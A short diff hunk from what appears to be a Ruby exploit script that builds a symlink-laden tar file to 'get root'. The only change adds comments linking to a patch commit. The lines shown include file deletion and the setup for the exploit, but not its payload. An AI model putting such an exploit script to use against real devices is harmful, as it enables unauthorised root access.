@@ -266,6 +266,10 @@ nastyfile = File.readlines(ARGV[1])
 nastyfile = nastyfile.join("")
 
 puts "Burning some 0day"
+
+# if win == 1 
+# Implement patch here: https://github.com/MAVProxyUser/P0VsRedHerring/commit/cd93baac92dd1dad02d93a2e16bd3f320a0d1012
+
 system("rm -rf symlink Burning0day.txt fireworks.tar")
 system("echo 'get root... Thx for all the fish P0V' > Burning0day.txt")
 puts "Creating the tar file"
